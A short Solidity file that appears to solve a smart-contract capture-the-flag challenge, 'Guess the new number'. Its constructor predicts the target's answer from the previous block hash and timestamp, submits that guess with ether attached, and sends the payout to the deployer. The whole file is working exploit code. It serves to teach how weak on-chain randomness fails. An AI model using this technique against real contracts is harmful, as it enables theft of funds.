// 1 - Deploy this contract using Injected Metamask using Remix

pragma solidity ^0.4.21;

interface IGuessTheNewNumberChallenge {
    function guess(uint8 n) external payable;

    function isComplete() external view returns (bool);
}

contract GuessTheNewNumberChallengeAttacker {
    IGuessTheNewNumberChallenge public guessTheNewNumberChallenge;

    function GuessTheNewNumberChallengeAttacker(address challengeAddress)
        public
        payable
    {
        guessTheNewNumberChallenge = IGuessTheNewNumberChallenge(
            challengeAddress
        );
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        guessTheNewNumberChallenge.guess.value(msg.value)(answer);
        msg.sender.transfer(address(this).balance);
    }
}
